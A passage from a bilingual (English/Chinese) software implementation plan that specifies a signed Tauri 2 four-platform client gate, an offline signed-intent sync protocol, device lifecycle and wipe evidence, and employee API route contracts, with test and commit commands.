git add -- crates/platform/flow/src/support_session.rs crates/platform/flow/src/lib.rs crates/platform/flow/Cargo.toml crates/adapter/db-pg/src/platform_ops/support_sessions.rs crates/adapter/db-pg/src/platform_ops/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml
git add -- crates/foundation/src/port/malware.rs crates/foundation/src/port/mod.rs crates/foundation/src/lib.rs crates/adapter/file/src/lib.rs crates/adapter/file/src/quarantine.rs crates/adapter/file/src/scanner.rs crates/adapter/file/src/publisher.rs crates/adapter/file/Cargo.toml
git add -- crates/adapter/windows-malware/Cargo.toml crates/adapter/windows-malware/src/lib.rs crates/adapter/windows-malware/src/defender.rs crates/adapter/windows-malware/src/amsi.rs crates/adapter/windows-malware/tests/verdict.rs
git add -- crates/platform/file/src/scan.rs crates/platform/file/src/scanner.rs crates/platform/file/src/intake_lifecycle.rs crates/platform/file/src/upload.rs crates/platform/file/src/lib.rs crates/platform/file/Cargo.toml crates/adapter/db-pg/src/platform_file/mod.rs crates/adapter/db-pg/src/platform_file/objects.rs crates/adapter/db-pg/src/platform_file/intake.rs
git add -- db/migrations/platform_file/V20261025092910__platform_file_create_upload_quarantine_and_scan_evidence.sql db/migrations/platform_ops/V20261025092920__platform_ops_create_support_sessions.sql docs/data-dictionary/platform_flow.md docs/event-catalog.md docs/metrics-catalog.md
git add -- xtask/src/scan_web_assets.rs xtask/src/main.rs testkit/tests/f57_control_center_security.rs testkit/tests/f57_remote_support.rs testkit/tests/f57_control_center_contract.rs testkit/tests/f57_file_quarantine.rs testkit/Cargo.toml
git commit -m "feat: add server authority control center"
```

### Task 17: Pass the Tauri 2 four-platform technology hard gate

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Create: `clients/technology-gate/tauri2/package.json`
- Create: `clients/technology-gate/tauri2/package-lock.json`
- Create: `clients/technology-gate/tauri2/tsconfig.json`
- Create: `clients/technology-gate/tauri2/index.html`
- Create: `clients/technology-gate/tauri2/vite.config.ts`
- Create: `clients/technology-gate/tauri2/vitest.config.ts`
- Create: `clients/technology-gate/tauri2/src/App.tsx`
- Create: `clients/technology-gate/tauri2/src-tauri/Cargo.toml`
- Create: `clients/technology-gate/tauri2/src-tauri/tauri.conf.json`
- Create: `clients/technology-gate/tauri2/src-tauri/src/lib.rs`
- Create: `clients/technology-gate/tauri2/src-tauri/src/main.rs`
- Create: `clients/technology-gate/tauri2/tests/gate.spec.ts`
- Runtime evidence output: `target/f57-ci-evidence/client-gate/f57-client-stack-decision.v1.json`
- Runtime evidence output: `target/f57-ci-evidence/client-gate/f57-client-distribution-certification.v1.json`
- Create: `docs/evidence/f57-client-stack-decision.schema.json`
- Create: `docs/evidence/f57-client-distribution-certification.schema.json`
- Create: `xtask/src/client_gate.rs`
- Modify: `xtask/src/main.rs`
- Modify: `Cargo.toml`
- Modify: `Cargo.lock`
- Modify: `xtask/src/f57check.rs`

**Interfaces:**
- Consumes: Task 9 signed generation and Task 16 UI-schema endpoint fixtures.
- Produces: cryptographically signed evidence with decision exactly `TAURI2_CERTIFIED` or `TAURI2_REJECTED` and a technical-gate-only `ClientDistributionCertificationPayloadV1`; Task 18 may start only with `TAURI2_CERTIFIED` and separately implements the client contract's live per-customer `ClientDistributionProfileV1` generation item.

- [ ] **Step 1: Write failing gate assertions**

```typescript
test("signed schema, encrypted cache, camera, file and intent replay work on all targets", async () => {
  const evidence = await runGate();
  expect(evidence.targets).toEqual(["windows-x64", "macos-universal", "ios-arm64", "android-arm64"]);
  expect(evidence.signedSchemaRejectedWhenTampered).toBe(true);
  expect(evidence.cacheEncryptedAtRest).toBe(true);
  expect(evidence.offlineIntentReplayedOnce).toBe(true);
  expect(evidence.cameraAndFilePicker).toBe(true);
});
```

- [ ] **Step 2: Run the gate in red state**

Run: `cargo xtask f57check --task F57-17 --phase pre-red && npm --prefix clients/technology-gate/tauri2 ci && npm --prefix clients/technology-gate/tauri2 test -- --run && cargo xtask f57-client-gate verify-fixtures`

Expected: FAIL because target builds and signed evidence do not exist.

- [ ] **Step 3: Implement the smallest real vertical prototype**

```rust
#[tauri::command]
async fn submit_intent(intent: SignedIntent) -> Result<IntentReceipt, ClientError> {
    intent.verify_local_shape()?;
    authority_client().submit(intent).await
}

#[tauri::command]
fn cache_policy() -> CachePolicy {
    CachePolicy { encrypted: true, customer_content_on_disk: false, max_offline_intents: 500 }
}
```

The prototype must render a server-signed task form, capture a photo/file, create one encrypted offline intent, reconnect, receive a single authoritative result, revoke the device and erase its cache. Build and launch evidence is required for all four targets; mocks may replace the authority server but not native packaging, cryptographic verification or device storage.

Both generated evidence artifacts are strict four-field `SignedBusinessArtifactV1<T>` envelopes verified only through Task 1 foundation; neither contains a free `signing_key_id`、algorithm、raw signature or caller trust path. They are never stored inside the repository tree whose digest they bind: only their JSON Schemas are committed, while actual envelopes are atomically written under `target/f57-ci-evidence/client-gate/`. `ClientStackDecisionPayloadV1` exact fields are `schema_version=1,purpose="EP-F57-CLIENT-STACK-DECISION-V1",decision,repository_tree_sha256,generation,ui_schema_payload_sha256,distribution_certification_payload_sha256,targets,ci_trust_bundle_sha256,started_at_utc,finished_at_utc`。`decision` is `TAURI2_CERTIFIED|TAURI2_REJECTED`。`targets` is the fixed exact-order four-row array `windows-x64,macos-universal,ios-arm64,android-arm64`; each strict `ClientTargetGateResultV1` is `{target,outcome,package_sha256,native_launch_evidence_sha256,native_test_result_sha256,lane_artifact_id,lane_artifact_payload_sha256,stable_error_code}`。For `PASS`, all digest/ref fields are non-null and `stable_error_code=null`; for `FAIL`, `stable_error_code` is a registered nonempty code and any unavailable artifact field is explicit JSON null. CERTIFIED requires four PASS rows; REJECTED requires at least one FAIL. `cms_signing_time=finished_at_utc` and only the Task 17 CI client-certification roster may sign it.

`ClientDistributionCertificationPayloadV1` exact fields are `schema_version=1,purpose="EP-F57-CLIENT-DISTRIBUTION-CERTIFICATION-V1",deployment_id,generation,entries,distribution_trust_bundle_sha256,issued_at,expires_at`。`entries` uses the same fixed four-target order and each strict row is `{target,audience="EMPLOYEE_WORKBENCH",customer_signing_identity_subject,allowed_distribution_channels,package_sha256,minimum_version,supported_versions,update_channel,rollback_channel,revocation_source,lost_certificate_response,dynamic_executable_extension_download,fallback}`。Channel values are the closed set `WINDOWS_MDM|MACOS_MDM|IOS_APP_STORE|ANDROID_MANAGED_PLAY|CUSTOMER_OFFLINE_REPOSITORY`; arrays are sorted/unique and compatible with target, versions are canonical SemVer sorted/unique and contain minimum, `dynamic_executable_extension_download="DENY"` on all mobile rows. `fallback` is JSON null unless a mobile store-unavailability contract exists, in which case it is exact `{kind:"WEB_PWA",origin,capability_difference_digest}`。`cms_signing_time=issued_at` and only the product/client-certification roster may sign it. Decision binds the verified certification payload digest; the certification never points back to the decision, so no digest cycle exists. This artifact proves the four-target technology gate only；it is not, and cannot replace, client-contract §3.1's per-customer/per-platform/per-audience `ClientDistributionProfileV1` signed-generation item that Task 18 implements. Both JSON Schemas model the strict envelope and every nested object with `additionalProperties:false`.

- [ ] **Step 4: Execute and sign the decision**

Run on the Windows lane: `cargo xtask f57-client-gate run --target windows-x64`; on the macOS/Xcode lane: `cargo xtask f57-client-gate run --target macos-universal` and `cargo xtask f57-client-gate run --target ios-arm64`; on the Android lane: `cargo xtask f57-client-gate run --target android-arm64`. After all three signed lane artifacts are present on the Windows evidence aggregator:

Run: `npm --prefix clients/technology-gate/tauri2 test -- --run && cargo xtask f57-client-gate aggregate && cargo xtask f57check --task F57-17 --phase post-green`

Expected for continuing this plan: PASS and the verified decision payload contains `decision="TAURI2_CERTIFIED"` with four package/native evidence rows; signer identity and detached CMS exist only in the common outer envelope. The Vitest run must execute `clients/technology-gate/tauri2/tests/gate.spec.ts` and its exact manifest-bound symbol before either decision or POST_GREEN receipt is accepted；`f57-client-gate aggregate` exact-joins that result digest with all four native target artifacts and cannot substitute a fixture-only pass. The verified distribution certification freezes every field above. Task 17's first aggregate binds the Task 17 current tree only to authorize progress；Task 25 must re-run the same aggregate over final-tree lane artifacts and replace the target output before final-tree receipts/release preparation, so an earlier-tree artifact is never release evidence. Tests cover unknown/extra fields、wrong purpose/time/trust domain、wrong target order/lane/digest、install、update、rollback、revoked package、stolen certificate、expired evidence and minimum-version enforcement. If any mandatory target or distribution proof fails, record a valid signed `TAURI2_REJECTED` result and hard-stop the entire F-57 plan. Task 18 and Tasks 19–25 must not start until an all-Flutter replacement is separately approved, completed and produces equivalent signed four-platform/distribution evidence; do not maintain two production client stacks.

`CLI-008` is owned by this technology gate but activates only in Task 18：Task 17 proves 四个 native packaging/signing/update/revocation carriers 并记录 `TAURI2_CERTIFIED`；Task 18 才把该证据 exact-join 到 live per-customer/per-platform/per-audience `ClientDistributionProfileV1` 与真实 Workbench API。seed 因此固定 `owner_task=F57-17,activation_task=F57-18`；Task 17 单独完成时仍为 `UNCERTIFIED`，不得宣称客户分发已经可用。

- [ ] **Step 5: Commit the gate evidence**

```bash
git add -- clients/technology-gate/tauri2/package.json clients/technology-gate/tauri2/package-lock.json clients/technology-gate/tauri2/tsconfig.json clients/technology-gate/tauri2/index.html clients/technology-gate/tauri2/vite.config.ts clients/technology-gate/tauri2/vitest.config.ts
git add -- clients/technology-gate/tauri2/src/App.tsx clients/technology-gate/tauri2/src-tauri/Cargo.toml clients/technology-gate/tauri2/src-tauri/tauri.conf.json clients/technology-gate/tauri2/src-tauri/src/lib.rs clients/technology-gate/tauri2/src-tauri/src/main.rs clients/technology-gate/tauri2/tests/gate.spec.ts
git add -- docs/evidence/f57-client-stack-decision.schema.json docs/evidence/f57-client-distribution-certification.schema.json
git add -- xtask/src/client_gate.rs xtask/src/main.rs Cargo.toml Cargo.lock
git add -- xtask/src/f57check.rs
git commit -m "test: certify tauri four platform gate"
```

### Task 18: Build one adaptive four-platform Workbench and offline-intent protocol

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Create: `docs/openapi/employee-api.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Create: `crates/platform/sync/Cargo.toml`
- Create: `crates/platform/sync/src/lib.rs`
- Create: `crates/platform/sync/src/intent.rs`
- Create: `crates/platform/sync/src/conflict.rs`
- Create: `crates/platform/sync/src/device.rs`
- Create: `crates/platform/sync/src/employee_api.rs`
- Create: `crates/platform/sync/src/client_distribution.rs`
- Create: `crates/platform/sync/src/offline_projection.rs`
- Create: `crates/platform/sync/src/dlp.rs`
- Create: `crates/platform/sync/tests/replay.rs`
- Create: `clients/workbench/package.json`
- Create: `clients/workbench/package-lock.json`
- Create: `clients/workbench/tsconfig.json`
- Create: `clients/workbench/index.html`
- Create: `clients/workbench/vite.config.ts`
- Create: `clients/workbench/vitest.config.ts`
- Create: `clients/workbench/src/main.tsx`
- Create: `clients/workbench/src/test/setup.ts`
- Create: `clients/workbench/src/app/App.test.tsx`
- Create: `clients/workbench/src/app/App.tsx`
- Create: `clients/workbench/src/schema/renderer.tsx`
- Create: `clients/workbench/src/tasks/TaskHome.tsx`
- Create: `clients/workbench/src/api/employee.ts`
- Create: `clients/workbench/src/security/dlp.ts`
- Create: `clients/workbench/src/offline/store.ts`
- Create: `clients/workbench/src-tauri/Cargo.toml`
- Create: `clients/workbench/src-tauri/src/lib.rs`
- Create: `clients/workbench/src-tauri/src/main.rs`
- Create: `clients/workbench/src-tauri/src/offline.rs`
- Create: `clients/workbench/src-tauri/tauri.conf.json`
- Modify: `Cargo.toml`
- Modify: `crates/platform/identity/src/types.rs`
- Modify: `crates/platform/identity/src/ports.rs`
- Modify: `crates/platform/identity/src/lifecycle.rs`
- Modify: `crates/platform/identity/src/login.rs`
- Modify: `crates/platform/identity/src/context_build.rs`
- Modify: `crates/platform/identity/src/testutil.rs`
- Modify: `crates/platform/identity/src/login_tests.rs`
- Modify: `crates/platform/identity/Cargo.toml`
- Create: `apps/core-server/src/platform/client_sync.rs`
- Create: `apps/core-server/src/platform/employee_api.rs`
- Modify: `apps/core-server/src/platform/mod.rs`
- Modify: `apps/core-server/src/lib.rs`
- Modify: `apps/core-server/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_meta/offline_intents.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/identity_sessions.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/mod.rs`
- Modify: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025093000__platform_meta_create_offline_intents.sql`
- Create: `db/migrations/platform_core/V20261025093010__platform_core_harden_employee_device_state_and_wipe_evidence.sql`
- Modify: `docs/data-dictionary.md`
- Modify: `docs/event-catalog.md`
- Modify: `docs/metrics-catalog.md`
- Create: `testkit/tests/f57_offline_conflicts.rs`
- Create: `testkit/tests/f57_workbench_contract.rs`
- Create: `testkit/tests/f57_device_lifecycle.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 trusted/monotonic clocks, Task 8 authorization, Task 9 generation, Task 16 UI schema, Task 17 `TAURI2_CERTIFIED` evidence and the immutable API discriminator、component-shape、component-state/state-domain and direct-route seeds.
- Produces: `ClientIntentV1`, `IntentReceipt`, `ConflictDecision`, `MinimalOfflineProjectionV1`, the versioned employee C/S API and one Workbench codebase packaged for Windows/macOS/iOS/Android.

- [ ] **Step 1: Write failing server-revalidation and conflict tests**

```rust
#[tokio::test]
async fn revoked_offline_approval_is_rejected_on_reconnect() {
    let intent = offline_intent("work_item.accept", generation(9), grant("g-1"));
    revoke("g-1").await;
    let receipt = submit(intent).await;
    assert_eq!(receipt.outcome, IntentOutcome::Rejected { code: "PLATFORM.AUTHZ.GRANT_REVOKED".into() });
}

#[test]
fn money_and_state_conflicts_never_auto_merge() {
    assert_eq!(classify_conflict(FieldClass::Money, versions(3, 4)), ConflictDecision::HumanReview);
    assert_eq!(classify_conflict(FieldClass::LifecycleState, versions(3, 4)), ConflictDecision::HumanReview);
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-18 --phase pre-red && cargo test -p ep-platform-sync --test replay`

Expected: FAIL because the sync crate does not exist.

- [ ] **Step 3: Implement the intent contract**

```rust
pub struct EmployeeCommandEnvelopeV1 {
    pub request_id: uuid::Uuid,
    pub command_type: CommandType,
    pub idempotency_key: String,
    pub expected_generation: GenerationId,
    pub expected_subject_version: u64,
    pub generation_report: ClientGenerationReportV1,
    pub client_version: String,
    pub device_key_id: DeviceKeyId,
    pub payload: serde_json::Value,
    pub device_signature: CanonicalBase64UrlBytes,
}

pub struct ClientIntentV1 {
    pub schema_version: u32,
    pub purpose: String,
    pub envelope_jcs: SecretBytes,
    pub queued_at_monotonic_marker: u64,
    pub local_attachment_draft_handles: Vec<OpaqueDraftHandle>,
}

pub enum ConflictDecision { Accept, MergeNonSensitiveFields { fields: Vec<String> }, HumanReview, RejectStaleGeneration }
```

`EmployeeCommandEnvelopeV1` is the one and only online/replay wire from Business §1.1 and the client contract；it has exactly the ten fields shown above and no actor、role、policy、capability override or device-authority claim. `device_signature` signs `SHA-256("EP-F57-EMPLOYEE-COMMAND-V1\0" || JCS(the other nine fields))` with the registered `device_key_id`；the server strict-parses the received exact bytes, rejects duplicate/unknown fields and never verifies a reserialized look-alike. `generation_report` is exactly §1.2.1 and is captured when the envelope is signed；`expected_generation` must equal its `observed_generation` and BOOTSTRAP cannot create a command.

`ClientIntentV1` is only the encrypted local queue carrier, never a second API envelope. It fixes `schema_version=1,purpose="EP-F57-CLIENT-INTENT-CARRIER-V1"` and stores the already canonical/signed employee envelope exact bytes in `envelope_jcs`; `request_id` is the sole intent identity and the local store makes it unique, so no `intent_id`、`signer_key_id`、second capability or second idempotency key exists. Replay submits `envelope_jcs` byte-for-byte to the same `/employee/v1/commands` operation used online；the server response and command receipt both bind its request/idempotency/preimage digest. Local monotonic/attachment-handle fields never enter authority decisions or extend server time. Tests replace each paired field, introduce a second ID/key, mutate after signing, reserialize to different bytes and replay online/offline under the same key；all mismatches fail without a second result.

On reconnect, the authenticated channel and registered device certificate resolve the device key to current principal/device bindings；a mismatched, revoked or reassigned binding is rejected. Server submission reconstructs actor/device context and performs current authorization, validation, SoD, re-auth, desired/observed/authoritative generation and three-digest compatibility, package revocation and idempotency. Auto-merge is limited to disjoint non-sensitive draft fields；money, quantity, lifecycle state, permission, contract terms, inventory and financial facts always require human review.

The client-observed timestamp is display metadata only. Replay age, token/grant freshness, nonce windows and conflict deadlines use server `TrustedClockV1` plus monotonic processing deadlines; a client timestamp can neither extend nor resurrect an intent.

- [ ] **Step 4: Implement task-first adaptive UI and device controls**

```tsx
export function TaskHome({schema, tasks}: Props) {
  return <AdaptiveShell
    primary={<ObjectiveQueue tasks={tasks} />}
    secondary={<ExceptionQueue tasks={tasks.filter(t => t.isException)} />}
    fallbackMenu={<SignedMenu schema={schema.menu} />}
  />;
}
```

The desktop layout uses resizable task/detail panes; mobile uses task cards and step pages. Both expose the same capability results. Mobile supports approvals permitted by policy, service work, scan, photo and offline draft; payment, final contract effect, permission/config generation and statutory actions remain server-online high-risk commands.

Workbench never calls Control Center routes, PostgreSQL or an unsigned/redirected endpoint. It uses only the signed `employee_api_origin`. `docs/openapi/employee-api.v1.yaml` must declare exact `info.title: Enterprise Platform Employee API`、`info.version: 1.0.0-f57`、`x-f57-status: CURRENT`、`x-source-authority: F57_TASK_18`、`x-planned-implementation-tasks: [F57-18]` and `x-implementation-state: IMPLEMENTED`。Its initial route set is exactly the 16 **method/path pairs** in Client §1.1: four session `POST`s；`POST /employee/v1/commands` plus `GET /employee/v1/commands/{request_id}`；`POST /employee/v1/queries`；`GET /employee/v1/tasks/stream`；`GET /employee/v1/ui-schema/{generation}`；the `POST/GET/PUT/POST/GET` upload/version sequence；and the two device `POST`s. The OpenAPI contract test compares method as well as path, so a path with an extra verb is an extra route. No generic RPC/object/table/control route、wildcard alias or optional trailing-slash route is admitted. Every operation has a fixed operationId、security scheme、stable error mapping and `x-f57-owner-task`; Tasks 19–24 may only append implemented discriminated command/query variants and bump `info.version` plus the registry in the same commit. A new method/path pair requires an explicit contract amendment.

The exact 16 Employee method/path/operationId/security-profile/request/result/error-schema tuples are the `surface=EMPLOYEE` rows of `docs/f57-api-direct-routes.seed.tsv`; this is the sole complete tuple registry, not the prose route summary. `employee-api.v1.yaml` and the generated Workbench client exact-equal all eleven columns, including bodyless GET=`request_schema:NONE` and each route's complete `error_code_set`, and every named component exact-equals the Task 1 direct-profile digest. Employee file completion is nonblocking `CompleteUploadSessionRequestV1→FileIngressAcceptedV1(QUARANTINED)`；all four clients poll the exact status GET with `Retry-After` plus capped exponential backoff/jitter, and only its PUBLISHED branch exposes `PublishedAttachmentRefV1`. A missing/extra tuple, operationId/security/schema/error-set swap, completion returning a published ref, status with loose nullable ref or client binding before PUBLISHED fails `f57_workbench_contract`.

The initial Employee discriminator slice is exactly the seven `EMPLOYEE/COMMAND` plus six `EMPLOYEE/QUERY` seed rows whose `owner_task=F57-18` and `introduced_version=1.0.0-f57`; the cumulative 1.0 contract is therefore `7/6` and `x-planned-implementation-tasks` is exactly `[F57-18]`. OpenAPI branches/extensions, the Rust Task 6 registrations and generated Workbench TypeScript union exact-equal all eleven seed columns for those 13 rows. No Task 19+ literal may appear early, including in an offline-intent fixture; missing/extra/future-owner rows or a payload/result/error/CAS/audience mismatch fails `f57_workbench_contract`.

The IDL models `ClientGenerationReportV1` and `ClientGenerationDirectiveV1` with the exact conditional BOOTSTRAP/ACTIVE shapes, requires the report on session start/renew、command、query and offline replay, and includes all mismatch negatives. Every object uses `additionalProperties:false`。Task 18 atomically changes the employee API row in `docs/openapi/README.md` and the authority register from `PLANNED_CREATE` to current/implemented；a YAML-only or table-only update fails. All four clients are generated from the same IDL/error catalog and prove equivalent version negotiation, desired/observed reporting, atomic observed activation, cursor, chunk/range, idempotency, session revocation, wrong-origin/proxy/redirect and stable-error behavior.

Task 18 also implements client-contract §3.1's live `ClientDistributionProfileV1` as a canonical `CLIENT_DISTRIBUTION_PROFILE` item inside Task 9 `SignedGenerationPayloadV1`，not as another outer signature. Its strict exact fields remain `schema_version,customer_id,platform,audience,carrier,application_id,package_digest,package_version,signing_identity_ref,signing_chain_digest,notarization_or_store_receipt,minimum_os_version,minimum_client_version,update_origin,rollout_policy,rollback_policy,revoked_digests,issued_at,expires_at`。There is exactly one current item per `(customer_id,platform,audience,generation)`；platform/carrier pairs use the contract's closed matrix, `revoked_digests[]` is sorted/unique, expiry is finite, and package/signing/store/MDM/update/rollback evidence exact-matches Task 17 certification and the customer distribution authority. A customer/platform/audience profile cannot be replaced by Task 17's four-target aggregate certification. Unknown field、wrong carrier/platform、cross-customer reuse、missing signer/store evidence、revoked digest、expired profile and dynamic mobile executable extension all fail before package launch.

The endpoint persists only encrypted, bounded queued intents, signed task schema, explicitly selected encrypted temporary attachment drafts and `MinimalOfflineProjectionV1`: task/object IDs, display-safe labels, required allowed fields, expected versions, signed schema references and encrypted attachment draft handles. It never persists money/credit/payment/bank/secret fields, unrestricted customer 360, bulk search/report results, audit history or a second authoritative business projection. Keys use the platform credential store, are device-revocable and are erased on logout, device revocation, policy expiry or MDM wipe. Tamper, rollback, copied-cache and key-unavailable tests fail closed.

Implement the client-contract DLP matrix: server-side row/field projection always applies; managed native endpoints enforce classification watermarking, export approval and the carrier-supported print/clipboard/share/managed-file restrictions; noncompliant/rooted/jailbroken devices are read-only or denied for high classifications; browser/PWA surfaces disclose best-effort limits and never claim to block an external camera. Every package also enforces Task 17 digest/minimum-version/revocation policy. `f57_workbench_contract` binds employee API, minimal projection, DLP and distribution requirements to the exact seed TestIDs; `f57_offline_conflicts` remains the deep sync fault suite.

Employee `DeviceState` 必须逐字实现 client contract §2.3 的闭集 `PENDING|COMPLIANT|RESTRICTED|REVOKED`。允许边恰为 `PENDING→COMPLIANT|RESTRICTED|REVOKED`、`COMPLIANT→RESTRICTED|REVOKED`、`RESTRICTED→COMPLIANT|REVOKED`；`REVOKED` 为终态，未列边全部拒绝。首次登记保持 PENDING；`RESTRICTED→COMPLIANT` 必须同一受控流程重验当前签名 attestation、轮换 device epoch/session credential 并证明零 revocation reason；永久撤销不能复用旧 device_id。PortalDeviceState 是 portal schema 的另一闭集，禁止复用本 enum/table。

`93010` migration 是已发布旧设备表到 F-57 的唯一演进：同一事务把旧 `ACTIVE→COMPLIANT`，替换 CHECK 为四态，新增正整数 `device_epoch`、current attestation policy/digest/time、restriction reason/state_changed_at，给 session 增 `bound_device_epoch`，并创建 append-only attestation transition 和 wipe command/outcome 表。`DeviceRepositoryPort::find_registered` 返回完整状态并取代 `find_active`；所有状态变更以 expected row version/epoch CAS，旧 session epoch 每请求拒绝。PENDING 只可登记/attest/update/diagnostic，COMPLIANT 才可正常工作，RESTRICTED 只可 re-attest/update/diagnostic 且拒绝高密级、离线和下载，REVOKED 全拒。F-56 许可的“已登记设备”经济口径保持不变但适配新 wire：只计 deployment 内去重的 `PENDING|COMPLIANT|RESTRICTED`，REVOKED 不计；不得通过进入 RESTRICTED 逃避设备额度。

每次 wipe 先落不可变 `SERVER_COMMAND_RECEIPT`，随后必须 exact-one 终结为 `ENDPOINT_ERASURE_RECEIPT` 或 `UNREACHABLE_EXPOSURE_WINDOW`；发送成功不得冒充端侧擦除，后者必须保存 last_contact、发送尝试、暴露上界、升级 capability 和后续重试状态。客户端只能提交 attestation 与真实端侧 receipt，不能提交 desired device state 或伪造 UNREACHABLE。`t_f57_cli_004` 与 `t_f57_sec_015` 在 `f57_workbench_contract`/`f57_device_lifecycle` 中逐边覆盖全部允许/未列转换、首次 PENDING、PENDING/RESTRICTED 的失败关闭、re-attestation 原子 epoch/session rotation、REVOKED 不可复活/新 ID 重登、重启耐久、并发 revoke-vs-attest、旧 epoch/session 拒绝、三种 wipe evidence 形状、端侧未确认不得伪造成功，以及许可计数 exact-set。

- [ ] **Step 5: Run four-platform, accessibility and conflict gates**

Run: `cargo test -p ep-platform-sync -p ep-platform-identity -p ep-adapter-db-pg -p core-server && cargo test -p ep-testkit --test f57_offline_conflicts --test f57_workbench_contract --test f57_device_lifecycle && npm --prefix clients/workbench ci && npm --prefix clients/workbench test -- --run && npm --prefix clients/workbench run build && cargo xtask f57-client-gate workbench-matrix && cargo xtask f57check --task F57-18 --phase post-green`

Expected: PASS on all four packages, WCAG AA automated checks, keyboard navigation, device revoke/cache wipe, duplicate replay and sensitive-conflict cases.

- [ ] **Step 6: Commit**

```bash
git add -- docs/openapi/employee-api.v1.yaml docs/openapi/README.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md crates/platform/sync/Cargo.toml crates/platform/sync/src/lib.rs crates/platform/sync/src/intent.rs crates/platform/sync/src/conflict.rs crates/platform/sync/src/device.rs
git add -- crates/platform/sync/src/employee_api.rs crates/platform/sync/src/client_distribution.rs crates/platform/sync/src/offline_projection.rs crates/platform/sync/src/dlp.rs crates/platform/sync/tests/replay.rs clients/workbench/package.json clients/workbench/package-lock.json
git add -- clients/workbench/tsconfig.json clients/workbench/index.html clients/workbench/vite.config.ts clients/workbench/vitest.config.ts clients/workbench/src/main.tsx clients/workbench/src/test/setup.ts
git add -- clients/workbench/src/app/App.test.tsx clients/workbench/src/app/App.tsx clients/workbench/src/schema/renderer.tsx clients/workbench/src/tasks/TaskHome.tsx clients/workbench/src/api/employee.ts clients/workbench/src/security/dlp.ts
git add -- clients/workbench/src/offline/store.ts clients/workbench/src-tauri/Cargo.toml clients/workbench/src-tauri/src/lib.rs clients/workbench/src-tauri/src/main.rs clients/workbench/src-tauri/src/offline.rs clients/workbench/src-tauri/tauri.conf.json
git add -- Cargo.toml apps/core-server/src/platform/client_sync.rs apps/core-server/src/platform/employee_api.rs apps/core-server/src/platform/mod.rs apps/core-server/src/lib.rs apps/core-server/Cargo.toml
git add -- crates/platform/identity/src/types.rs crates/platform/identity/src/ports.rs crates/platform/identity/src/lifecycle.rs crates/platform/identity/src/login.rs crates/platform/identity/src/context_build.rs crates/platform/identity/src/testutil.rs crates/platform/identity/src/login_tests.rs crates/platform/identity/Cargo.toml
git add -- crates/adapter/db-pg/src/platform_meta/offline_intents.rs crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/platform_core/identity_sessions.rs crates/adapter/db-pg/src/platform_core/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml
git add -- db/migrations/platform_meta/V20261025093000__platform_meta_create_offline_intents.sql db/migrations/platform_core/V20261025093010__platform_core_harden_employee_device_state_and_wipe_evidence.sql docs/data-dictionary.md docs/event-catalog.md docs/metrics-catalog.md
git add -- testkit/tests/f57_offline_conflicts.rs testkit/tests/f57_workbench_contract.rs testkit/tests/f57_device_lifecycle.rs testkit/Cargo.toml
git commit -m "feat: add adaptive workbench and intent sync"
```

### Task 19: Deliver the customer-to-contract-to-order vertical closure

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/employee-api.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `crates/contract/mdm/src/lib.rs`
- Modify: `crates/domain/mdm/src/lib.rs`
- Modify: `crates/application/mdm/src/lib.rs`
- Modify: `crates/contract/crm/src/lib.rs`
- Modify: `crates/domain/crm/src/lib.rs`
- Modify: `crates/application/crm/src/lib.rs`
- Modify: `crates/contract/cpq/src/lib.rs`
- Modify: `crates/domain/cpq/src/lib.rs`
- Modify: `crates/application/cpq/src/lib.rs`
- Modify: `crates/contract/clm/src/lib.rs`
- Modify: `crates/domain/clm/src/lib.rs`
- Modify: `crates/application/clm/src/lib.rs`
- Modify: `crates/contract/sales/src/lib.rs`
- Modify: `crates/domain/sales/src/lib.rs`
- Modify: `crates/application/sales/src/lib.rs`
- Create: `apps/core-server/src/business.rs`
- Create: `apps/core-server/src/wiring/business.rs`
- Modify: `apps/core-server/src/lib.rs`
- Modify: `apps/core-server/src/wiring/mod.rs`
- Modify: `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/src/platform/employee_api.rs`
- Modify: `clients/workbench/src/api/employee.ts`
- Modify: `apps/core-server/Cargo.toml`
- Create: `testkit/tests/f57_customer_contract_order.rs`
- Modify: `testkit/tests/f57_workbench_contract.rs`
- Modify: `testkit/Cargo.toml`
- Test manifest: exact MDM/CRM/CPQ/CLM/SAL rows whose `activation_task=F57-19` in `docs/generated/f57-task-manifest.tsv`；MDM-006 remains owned by F57-19 but activates only in Task 23 after the real Excel/CSV import/export pipeline exists

**Interfaces:**
- Consumes: Task 3 persistence, Task 6 command bus, Task 8 authorization, Task 9 generation, Task 11 atomic evidence, Task 12 obligations and the immutable API discriminator/component/state/direct-route authorities. Superseded Stage 5/6 plans are field/rule references only; their lower-version SQL is never created.
